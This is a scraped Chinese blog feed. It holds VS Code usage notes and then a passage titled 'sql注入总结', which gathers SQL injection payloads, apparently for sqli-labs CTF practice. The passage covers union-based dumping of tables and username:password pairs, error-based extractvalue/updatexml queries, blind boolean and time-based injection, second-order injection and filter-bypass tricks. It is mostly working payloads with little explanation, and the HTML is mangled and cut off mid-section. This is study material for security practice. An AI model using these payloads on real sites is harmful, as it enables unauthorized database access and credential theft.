id="预设变量"><a href="#预设变量" class="headerlink" title="预设变量"></a>预设变量</h2><p>上面我们提到了，在每个 Tab Stop 的位置，我们可以提供占位符，也就是提前预设好一些值。但这些占位符是我们提前写在代码片段里的，跟当前代码的上下文往往没什么关系。不过，VS Code 的代码片段支持里，还提供了一种模板，叫做<strong>预设变量</strong>。</p><p>比如说，我们想在代码片段里的某个位置使用剪切板的内容，那么我们在那个位置写上 <code>$CLIPBOARD</code> 就好了，如果我们希望插入代码片段后自己可以修改这个值，也可以将它放在一个 Tab Stop 里面，语法则是 <code>${1:$CLIPBOARD}</code>。</p><p>除了剪切板，VS Code 还支持其他数十个预设值，大家可以按需自行<a href="https://code.visualstudio.com/docs/editor/userdefinedsnippets#_variables" target="_blank" rel="noopener">查看文档</a>，自己尝试。</p></li></ul><h2 id="一定要用好代码折叠、小地图和面包屑特性"><a href="#一定要用好代码折叠、小地图和面包屑特性" class="headerlink" title="一定要用好代码折叠、小地图和面包屑特性"></a>一定要用好代码折叠、小地图和面包屑特性</h2><h3 id="代码折叠"><a href="#代码折叠" class="headerlink" title="代码折叠"></a>代码折叠</h3><ul><li><p>当我们按下 “Cmd + Option + 左方括号”（Windows 上是 Ctrl + Shift + 左方括号），当前光标所处的最内层的、可以被折叠的代码就会被<strong>折叠</strong>起来。请注意，我们在这里加了两个限制条件，“最内层”和“可以被折叠”。</p></li><li><p>前光标位置开始，一直到最外层的，所有可以被折叠的部分递归地折叠起来,按下 “Cmd + K ”“Cmd + 左方括号”（Windows 上是 Ctrl + K、Ctrl + 左方括号）。而至于如何递归地展开，不用问你肯定也知道，是：依次按下“Cmd + K ”“Cmd + 右方括号”。</p></li><li><p>折叠当前页面所有代码,按下 “Cmd + K”“Cmd + 0”（Windows 上是 Ctrl + K，Ctrl + 0）即可</p></li><li><h3 id="基于语言定义的代码折叠"><a href="#基于语言定义的代码折叠" class="headerlink" title="基于语言定义的代码折叠,"></a>基于语言定义的代码折叠,</h3><ul><li>// region Main</li><li>// endregion</li></ul></li></ul><h3 id="小地图"><a href="#小地图" class="headerlink" title="小地图"></a>小地图</h3><p>editor.minimap</p><h3 id="面包屑"><a href="#面包屑" class="headerlink" title="面包屑"></a>面包屑</h3><p>左到右，我们能够看到一层一层文件夹的名字，然后是当前文件名，最后则是光标所在的函数的名字。我们可以通过点击这个工具栏上的文字，然后进行文件夹、文件或者是函数的跳转。</p><h2 id="极速搜索有时候比Intellisense还重要"><a href="#极速搜索有时候比Intellisense还重要" class="headerlink" title="极速搜索有时候比Intellisense还重要"></a>极速搜索有时候比Intellisense还重要</h2><h3 id="单文件搜索"><a href="#单文件搜索" class="headerlink" title="单文件搜索"></a>单文件搜索</h3><ul><li>cmd+f<ul><li>光标会到搜索框</li></ul></li><li>cmd+g<ul><li>光标不变</li></ul></li><li>加shift反向跳转</li><li>按下 “Cmd + Option + R”（Windows 上是 Alt + R），就能够打开正则表达式的支持</li><li>捷键直接调出替换窗口。最常用的命令就是按下 “Cmd + Option + F”</li><li>下“Shift + Tab” 键将光标移动到上面的搜索输入框里。“Tab”和“Shift + Tab”键能够帮助你在这两个输入框直接进行跳转。</li></ul><h3 id="多文件搜索和替换"><a href="#多文件搜索和替换" class="headerlink" title="多文件搜索和替换"></a>多文件搜索和替换</h3><p>“Cmd + Shift + F” （Windows 上是 Ctrl + Shift + F）来调出多文件搜索的视图</p><p>按三个点,支持选择文件,glob语法</p><p>通配符操作，<em>,?,[]这三个通配符，</em>代表0个或多个字符，?代表一个字符，[]匹配指定范围内的字符</p><h3 id="多文件搜索配置"><a href="#多文件搜索配置" class="headerlink" title="多文件搜索配置"></a>多文件搜索配置</h3><ul><li><strong>第一个是“search.collapseResults”</strong>。它是用来控制是否自动展开搜索结果</li><li><strong>第二个是 “search.location” ，也就是多文件搜索视图的位置</strong>。</li></ul><h2 id="优化你的编辑器设置"><a href="#优化你的编辑器设置" class="headerlink" title="优化你的编辑器设置"></a>优化你的编辑器设置</h2><h1 id="VS-Code-的界面"><a href="#VS-Code-的界面" class="headerlink" title="VS Code 的界面"></a>VS Code 的界面</h1><h2 id="工作台"><a href="#工作台" class="headerlink" title="工作台"></a>工作台</h2><ul><li>ctrl++shift+f 文件资源管理器，主要用于浏览和管理文件和文件夹。</li><li>跨文件搜索，用于在当前文件夹内进行跨文件的搜索。</li><li>win+shift+g源代码管理，用于对当前文件夹下的代码进行版本管理，默认 VS Code 支持的版本管理软件是 Git。</li><li>启动和调试，用于对当前文件夹下的项目进行运行和调试。</li><li>扩展管理，用于下载和管理 VS Code 里的插件。</li></ul><h3 id="命令面板"><a href="#命令面板" class="headerlink" title="命令面板"></a>命令面板</h3><p>首先是几个<strong>符号</strong>：</p><ol><li><code>&gt;</code>（大于号） ，用于显示所有的命令。</li><li>@ ，用于显示和跳转文件中的“符号”（Symbols），在@符号后添加冒号：则可以把符号们按类别归类。</li><li><code>#</code>号，用于显示和跳转工作区中的“符号”（Symbols）。</li><li>：（冒号）， 用于跳转到当前文件中的某一行。</li></ol><p>这几个符号所对应的命令我们在之前的文章中已经研究过，比较好记。输入这些符号后，继续输入相应内容就可以对结果进行搜索了。</p><p>剩下的都是<strong>英文单词或者缩写</strong>，知道它们的含义后就可以轻松掌握了：</p><ol><li>edt 是 edit（编辑）的缩写，输入 edt 和一个空格，命令面板就会显示所有已经打开的文件；而<code>edt active</code>则只会显示当前活动组中的文件。</li><li>ext 是 extension（插件）的缩写，输入 ext 和一个空格，就可以进行插件的管理；<code>ext install</code> 则可以在命令面板中搜索和安装插件。</li><li>task和debug 分别对应于任务和调试功能。这两个功能的使用我会在之后的章节中详细讲解。</li><li>term 是 terminal（终端）的缩写，你可以用这个命令来创建和管理终端实例。</li><li>view 则是用于打开 VS Code 的各个 UI 组件。</li></ol><h3 id="有趣的设置"><a href="#有趣的设置" class="headerlink" title="有趣的设置"></a>有趣的设置</h3><ul><li>第一个设置是“workbench.commandPalette.history”。</li><li>另一个设置是 “workbench.commandPalette.preserveInput”，它的默认值是 false。如果你把它的值改成 true 的话，那么你在命令面板里搜索了某个命令并执行了，当你下次打开命令面板的时候，之前输入的值还在命令面板的输入框里</li></ul><h3 id="资源管理器"><a href="#资源管理器" class="headerlink" title="资源管理器"></a>资源管理器</h3><h4 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h4><h4 id="多文件夹工作区（multi-root-workspace）"><a href="#多文件夹工作区（multi-root-workspace）" class="headerlink" title="多文件夹工作区（multi-root workspace）"></a>多文件夹工作区（multi-root workspace）</h4><ul><li>命令面板，搜索 “将文件夹添加到工作区” （add folder to workspace）</li><li>保存这个工作区，接下来你可以调出命令面板，搜索“将工作区另存为” （save workspace as），VS Code 就会为这个工作区创建一个文件，这个文件的后缀名是 “code-workspace”。</li></ul><h4 id="工作区切换"><a href="#工作区切换" class="headerlink" title="工作区切换"></a>工作区切换</h4><ul><li><p>Ctrl + W，或者调出命令面板，搜索 “切换窗口（Switch Window）”，然后选择你要跳转的那个文件夹中</p></li><li><p>快速切换窗口（Quick Switch Window,要跳转到上一个打开的窗口</p></li><li><p>如果你同一时间只会关注一个项目，那你也大可不必使用多个窗口。我就经常只用一个显示器和一个窗口，然后当我想在另外一个项目上工作时，我就会按下 Ctrl + R（或者使用命令面板，搜索 “打开最近的文件”），此时我就能够看到最近操作过的文件夹并按下回车键进行切换了</p></li><li>当你按下 Ctrl + R 调出最近打开的文件夹的列表后，也能够按下 Cmd + 回车键，将它在一个新的窗口中打开</li></ul><h3 id="版本管理"><a href="#版本管理" class="headerlink" title="版本管理"></a>版本管理</h3><h4 id="差异编辑器"><a href="#差异编辑器" class="headerlink" title="差异编辑器"></a>差异编辑器</h4><ul><li>前四个按钮<ul><li>第一个按钮的功能是从差异编辑器跳转到一个普通的编辑器，并且打开这个文件。这样我们能够无干扰地进行编辑操作了</li><li>第二个按钮控制的是：是否要在差异编辑器里显示代码里行末的空格符的变化。比如说你不小心在行末添加了几个空格，默认情况下，VS Code 觉得这几个空格不影响代码，就不会在差异编辑器里显示。但我建议把它打开，这样你就可以确保能够看到所有的代码改动。</li><li>接下来的两个箭头按钮，就是用于在当前文件里的多个变动之间进行跳转了。</li></ul></li></ul><h4 id="下拉菜单"><a href="#下拉菜单" class="headerlink" title="下拉菜单"></a>下拉菜单</h4><p>最后是一个三个点的图标，想必不用点击开你也知道，它意味着里面有更多的功能，点击后即可看到一个下拉菜单。</p><h4 id="代码内的差异编辑"><a href="#代码内的差异编辑" class="headerlink" title="代码内的差异编辑"></a>代码内的差异编辑</h4><h3 id="配置终端模拟器"><a href="#配置终端模拟器" class="headerlink" title="配置终端模拟器"></a>配置终端模拟器</h3><h4 id="创建终端"><a href="#创建终端" class="headerlink" title="创建终端"></a>创建终端</h4><ul><li>Ctrl + ` 键，一个新的终端就被创建出来了</li><li><p>在按Ctrl + ` 键将其隐藏。</p></li><li><p>Ctrl + Shift + `，或者在命令面板里搜索 “新建集成终端</p></li></ul><h4 id="切换"><a href="#切换" class="headerlink" title="切换"></a>切换</h4><ul><li>命令面板里运行 “聚焦于下一终端” （Focus Next Terminal）或者 “聚焦于上一终端” （Focus Previous Terminal）进行切换</li><li>-只需按下 Cmd + \ 或者运行 “拆分终端”（Split Terminal），就能够将当前的终端一分为二；如果再次按下这个快捷键，就能够将当前的面板平均分为三份</li><li>拆分终端之间切换的快捷方式,聚焦于下一个窗格” (Focus Next Pane)、“聚焦于上一个窗格” (Focus Previous Pane)</li></ul><h4 id="终端内操作"><a href="#终端内操作" class="headerlink" title="终端内操作"></a>终端内操作</h4><ul><li><p>我们能够在终端里使用 Shell 自身支持的那些快捷键操作。比如在 Bash 里，我们可以按下 “Ctrl + A” 或者 “Home” 键把光标移动到一行的开头，也可以按下 “Option + 左方向键” （Windows 上是 Alt + 左方向键）把光标向前移动一个单词；如果我们在集成终端里使用的也是 Bash，那么这些操作依然生效。</p></li><li><p>VS Code 也为几个常用的操作提供了接近于编辑器命令的快捷键</p></li><li><p>按下“Cmd + F”调出搜索框</p></li></ul><h4 id="功能整合"><a href="#功能整合" class="headerlink" title="功能整合"></a>功能整合</h4><ul><li><p>集成终端中非常轻松地打开一个文件。按下 Cmd 键，然后把鼠标移动到这个文件名的上面，我们就能看到这个文件名下出现了一个下划线，这说明集成终端成功检测出了这个文件的位置，此时只需按下鼠标左键就能将这个文件在当前编辑器中打开</p></li><li><p>集成终端和资源管理器也有互动。比如我们打开了一个脚本文件，希望直接执行这个脚本文件，就可以打开命令面板，运行 “在活动终端中运行活动文件”（Run Active File In Active Terminal），这样这个脚本就会在当前打开的集成终端中运行了</p></li><li>我们也可以选中编辑器中的某段代码，然后打开命令面板，运行“在活动终端中运行所选文本”（Run Selected Text In Active Terminal），这段代码就会在终端中执行。</li><li>对了，我们在使用命令行的时候，一个经常做的操作就是 cd 进入某个文件夹，或者 cd … 回退到上一层文件夹，甚至有的时候需要多次运行这个命令才能调整到我们期望的某个文件夹下然后再进行操作。有个资源管理器，这个场景就简单多了，我们只需在目标文件夹上按下右键调出上下文菜单，然后选择 “在终端中打开”。</li><li>第二个则是关于终端的持久化,tmux</li></ul><h3 id="你的项目打造Workflow"><a href="#你的项目打造Workflow" class="headerlink" title="你的项目打造Workflow"></a>你的项目打造Workflow</h3><h4 id="执行任务"><a href="#执行任务" class="headerlink" title="执行任务"></a>执行任务</h4><h4 id="自定义任务"><a href="#自定义任务" class="headerlink" title="自定义任务"></a>自定义任务</h4><h3 id="debugger"><a href="#debugger" class="headerlink" title="debugger"></a>debugger</h3><h3 id="工作区快捷键"><a href="#工作区快捷键" class="headerlink" title="工作区快捷键"></a>工作区快捷键</h3><h4 id="编辑器操作"><a href="#编辑器操作" class="headerlink" title="编辑器操作"></a>编辑器操作</h4><ul><li><p>创建出多个编辑器 Cmd + \”（Windows 上是 Ctrl + \），或者从命令面板里搜寻 “拆分编辑器” （Split Editor）并运行即可实现。 </p></li><li><p>你可以按下 “Cmd + 1”“Cmd + 2”和“Cmd + 3”（Windows 上是 Ctrl+1，Ctrl+2，Ctrl+3）分别在这三个编辑器跳转</p></li><li>纵向的布局。所以你可以使用命令 “切换垂直/水平编辑器布局” （Flip Editor Group Layout）或者按下“Cmd + Option + 0”（Windows 上是 Shift + Alt + 0）来进行布局方向的切换</li></ul><h4 id="tab"><a href="#tab" class="headerlink" title="tab"></a>tab</h4><p>在 Tab 之间进行跳转。你可以使用命令 “打开上/下一个编辑器”（Open Previous/Next Editor）或者按下 “Cmd + Option + 左/右方向键”（Windows 上是 Ctrl + Pagedown/Pageup）在编辑器 Tab 之间进行跳转。</p><p>要注意的是，这个命令会依次打开每个编辑器组里的每个 Tab。但是如果你只希望在某个编辑器组里进行跳转的话，那么你就需要另一个命令 “打开组中的下一个编辑器”（Open Next Editor in Group）。</p><ul><li><p>移动编辑器 Tab</p><p>除了将鼠标聚焦到其他编辑器组里，VS Code 还允许我们把当前的编辑器 Tab 移动到其他编辑器组当中去。比如我们可以使用命令 “将编辑器移动到下一组”（Move Editor into Next Group），将当前的 Tab 移动到下一个编辑器组中。</p></li><li><p>网格布局</p></li><li><p>VS Code 肯定会添加命令让我们能跳转到当前编辑器上方、下方、左侧和右侧的“编辑器”。比如在下图中，我就使用了 “聚焦到上方编辑器组”（Focus Above Editor Group）</p></li><li><p>Cmd + B （Windows 上是 Ctrl + B）打开或者关闭整个视图</p></li><li><p>也可以按下 Cmd + J （Windows 上是 Ctrl + J）来打开或者关闭面板</p></li><li><p>如果我们不希望看到最左侧的活动栏，或者最下面的状态栏，也可以通过命令 “切换活动栏可见性”（Toggle Activity Bar Visibility）和 “切换状态栏可见性”（Toggle Status Bar Visibility）来一键开关</p></li><li><p>通过运行 “切换禅模式”(Toggle Zen Mode)，就可以把侧边栏、面板等全部隐藏。进入禅模式后，只需按下 Escape 键，即可退出禅模式</p></li><li><p>大屏幕 切换居中布局”（Toggle Centered Layout），将编辑器放在 VS Code 工作区的正中间，同时你还可以通过拉动编辑器两边的边框，调整编辑器的宽度。如此一来，当你使用大屏幕时，就不用担心编辑器里的代码，都“缩”在屏幕的左上角了。</p></li></ul><h3 id="python语言支持"><a href="#python语言支持" class="headerlink" title="python语言支持"></a>python语言支持</h3><p>Python 插件会自动读取本地的各种 Python packages，然后为你提供智能提醒。而这里特别值得一提的是，如果你有一些第三方的 Python 脚本，但是它们并没有被VS Code的 Python 插件所识别，而你又希望能够获得它们的智能提示，那你可以通过添加如下的配置来实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;python.autoComplete.extraPaths&quot;: [</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>Python 插件就会分析 python.autoComplete.extraPaths 下的所有文件夹，然后分析这些代码，并且提供 IntelliSense。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;vs code 使用教程&lt;/p&gt;
    
    </summary>
    
      <category term="杂" scheme="http://blog.wendelltong.xyz/categories/%E6%9D%82/"/>
    
    
      <category term="学习笔记" scheme="http://blog.wendelltong.xyz/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
      <category term="vscode" scheme="http://blog.wendelltong.xyz/tags/vscode/"/>
    
  </entry>
  
  <entry>
    <title>sql注入总结</title>
    <link href="http://blog.wendelltong.xyz/Ctf_web/sql%E6%B3%A8%E5%85%A5.html"/>
    <id>http://blog.wendelltong.xyz/Ctf_web/sql注入.html</id>
    <published>2019-07-28T15:20:02.000Z</published>
    <updated>2019-09-20T12:26:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>笔记</p><a id="more"></a><h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><h2 id="闭合语句"><a href="#闭合语句" class="headerlink" title="闭合语句"></a>闭合语句</h2><p>注释符号是否可用</p><p>‘,”,’),”),’))</p><h1 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h1><h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">测试显示位置</span><br><span class="line">?id=-1&apos; order by 3--+</span><br><span class="line">?id==-1&apos; union select 1,2,3--+</span><br><span class="line">得到‘security’库名</span><br><span class="line">?id=-1&apos; union select 1,2,database() --+</span><br><span class="line">爆表payload</span><br><span class="line">?id=-1&apos; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</span><br><span class="line">爆列名（字段）payload</span><br><span class="line">?id=0&apos; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos; --+</span><br><span class="line">爆值payload,3a是十进制的58，是ascii中的 &apos;:&apos; ，用以分割pasword和username。</span><br><span class="line">?id=0&apos; union select 1,2,group_concat(username,0x3a,password) from users--+</span><br></pre></td></tr></table></figure><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h3><p>爆表payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and extractvalue(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()))) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>爆列名（字段）payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">没有完全显示</span><br><span class="line"></span><br><span class="line">使用</span><br><span class="line"></span><br><span class="line">``` and column_name not in (&apos;user_id&apos;,&apos;first_name&apos;,&apos;last_name&apos;,&apos;user&apos;,&apos;avatar&apos;,&apos;last_login&apos;,&apos;failed_login&apos;)</span><br></pre></td></tr></table></figure><p>来显示其他值：</p><p>爆值payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))—+</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">同样使用not in显示其他值</span><br><span class="line"></span><br><span class="line">### updatexml</span><br><span class="line"></span><br><span class="line">payload：</span><br><span class="line"></span><br><span class="line">uname=admin&amp;passwd=11&apos;  and  updatexml(1,concat(0x7e,(select password from (select password from users where username=&apos;admin&apos;) mingzi ),0x7e),1) --+&amp;submit=Submit</span><br><span class="line">也可以用：</span><br><span class="line"></span><br><span class="line">uname=admin&amp;passwd=11&apos;  and  updatexml(1,concat(0x7e,(select password from (select password from users limit 7,1) test ),0x7e),1) --+&amp;submit=Submit</span><br><span class="line">### 双查询注入,适用于只报错误语句的情况,有概率</span><br></pre></td></tr></table></figure><p>基于聚合分组函数的双注入</p><p>下面是payload:</p><p>1、爆库名:</p><p>?id=1’ union select 1,count(<em>),concat((select database()),floor(rand()</em>2)) as a from information_schema.columns group by a%23</p><p>2、爆表名：</p><p>?id=1’ union select 1,count(<em>),concat((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),floor(rand()</em>2)) as a from information_schema.columns group by a%23</p><p>将从limit 0,1依次变到limit 3,1即可爆出所有的表</p><p>3、爆列名：</p><p>?id=1’ union select 1,count(<em>),concat((select column_name from information_schema.columns where table_schema=’security’  and table_name=’users’ limit 0,1),floor(rand()</em>2)) as a from information_schema.columns group by a%23</p><p>4、爆内容：<br>?id=1’ union select 1,count(<em>),concat((select username from security.users limit 0,1),floor(rand()</em>2)) as a from information_schema.tables group by a%23</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">参考资料</span><br><span class="line"></span><br><span class="line">- https://www.cnblogs.com/huangming-zzz/p/9878773.html</span><br><span class="line">- https://www.2cto.com/article/201303/192718.html</span><br><span class="line"></span><br><span class="line"># 无回显</span><br><span class="line"></span><br><span class="line">## bool盲注</span><br><span class="line"></span><br><span class="line">&gt; 验证</span><br><span class="line"></span><br><span class="line">?id=1&apos; and 1=1--+    //正确</span><br><span class="line">?id=1&apos; and 1=2--+  //失败</span><br><span class="line"></span><br><span class="line">## 时间盲注</span><br><span class="line"></span><br><span class="line">payload</span><br></pre></td></tr></table></figure><p>uname=admin’ and if(length(database())=8,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submit</p><p>uname=admin’ and if(left(database(),1)=’s’,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submit</p><p>uname=admin’ and if( left((select table_name from information_schema.tables where table_schema=database() limit 1,1),1)=’r’ ,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submit</p><p>uname=admin’ and if(left((select column_name from information_schema.columns where table_name=’users’ limit 4,1),8)=’password’ ,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submit<br>uname=admin’ and if(left((select password from users order by id limit 0,1),4)=’dumb’ ,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submit</p><p>uname=admin’ and if(left((select username from users order by id limit 0,1),4)=’dumb’ ,sleep(5),1)–+&amp;passwd=admin&amp;submit=Submit<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># 二次注入</span><br><span class="line"></span><br><span class="line">注册admin&apos;# .改密码就会修改admin的密码</span><br><span class="line"></span><br><span class="line"># 各种绕过姿势(转)</span><br><span class="line"></span><br><span class="line">## 1.绕过空格（注释符/* */，%a0）：</span><br><span class="line"></span><br><span class="line">　　`两个空格代替一个空格，用Tab代替空格，%a0=空格：`</span><br></pre></td></tr></table></figure></p><p>%20 %09 %0a %0b %0c %0d %a0 %00 /*<em>/  /</em>!*/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最基本的绕过方法，用注释替换空格：</span><br></pre></td></tr></table></figure></p><p>/<em>  注释 </em>/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![img](../../images/sql注入/1206476-20170728221518555-1717045547.png)</span><br><span class="line"></span><br><span class="line">使用浮点数：</span><br></pre></td></tr></table></figure></p><p>select <em> from users where id=8E0union select 1,2,3<br>select </em> from users where id=8.0 select 1,2,3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 2.括号绕过空格：</span><br><span class="line"></span><br><span class="line">　　如果空格被过滤，括号没有被过滤，可以用括号绕过。</span><br><span class="line"></span><br><span class="line">　　在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</span><br><span class="line"></span><br><span class="line">例如：</span><br></pre></td></tr></table></figure></p><p>select(user())from dual where(1=1)and(2=2)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">　　这种过滤方法常常用于time based盲注,例如：</span><br></pre></td></tr></table></figure></p><p>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">（from for属于逗号绕过下面会有）</span><br><span class="line"></span><br><span class="line">　　上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</span><br><span class="line"></span><br><span class="line">## 3.引号绕过（**使用十六进制**）：</span><br><span class="line"></span><br><span class="line">　　会使用到引号的地方一般是在最后的`where`子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</span><br></pre></td></tr></table></figure></p><p>select column_name  from information_schema.tables where table_name=”users”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">　　这个时候如果引号被过滤了，那么上面的`where`子句就无法使用了。那么遇到这样的问题就要使用**十六进制**来处理这个问题了。</span><br><span class="line">`　　users`的十六进制的字符串是`7573657273`。那么最后的sql语句就变为了：</span><br></pre></td></tr></table></figure></p><p>select column_name  from information_schema.tables where table_name=0x7573657273<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 4.逗号绕过（**使用from或者offset**）：</span><br><span class="line"></span><br><span class="line">　　在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用`from to`的方式来解决：</span><br></pre></td></tr></table></figure></p><p>select substr(database() from 1 for 1);<br>select mid(database() from 1 for 1);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">使用join：</span><br></pre></td></tr></table></figure></p><p>union select 1,2     #等价于<br>union select * from (select 1)a join (select 2)b<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">　　使用like：</span><br></pre></td></tr></table></figure></p><p>select ascii(mid(user(),1,1))=80   #等价于<br>select user() like ‘r%’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">　　对于`limit`可以使用`offset`来绕过：</span><br></pre></td></tr></table></figure></p><p>select * from news limit 0,1</p><h1 id="等价于下面这条SQL语句"><a href="#等价于下面这条SQL语句" class="headerlink" title="等价于下面这条SQL语句"></a>等价于下面这条SQL语句</h1><p>select * from news limit 1 offset 0<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）：</span><br><span class="line"></span><br><span class="line">### 使用greatest()、least（）：（前者返回最大值，后者返回最小值）</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">　　同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到`greatest`来进行绕过了。</span><br><span class="line">　　最常见的一个盲注的sql语句：</span><br></pre></td></tr></table></figure></p><p>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">　　此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用`greatest`来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。</span><br><span class="line">　　那么上面的这条sql语句可以使用`greatest`变为如下的子句:</span><br></pre></td></tr></table></figure></p><p>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 使用between and： </span><br><span class="line"></span><br><span class="line">   between a and b：返回a，b之间的数据，不包含b。</span><br><span class="line"></span><br><span class="line">## 6.or and xor 